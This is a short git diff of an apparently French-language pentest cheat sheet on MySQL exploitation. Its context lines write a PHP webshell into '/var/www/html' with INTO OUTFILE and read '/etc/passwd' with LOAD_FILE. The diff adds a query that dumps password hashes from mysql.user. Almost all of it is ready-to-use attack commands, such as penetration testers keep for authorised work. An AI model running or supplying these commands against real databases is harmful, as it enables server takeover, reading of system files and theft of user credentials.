@@ -47,6 +47,11 @@ select * from <table> where <column> like "<debut du texte>%";
  show variables like "secure_file_priv";
 -- Ecriture d'un webshell 
 mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+
+-- dump des hash de la DB
+SELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !=''
+
 ```
 
 ## Exploitation
@@ -59,3 +64,5 @@ select LOAD_FILE("/etc/passwd");
 select TO_BASE64(LOAD_FILE("/etc/passwd"));
 
 ```
+
+
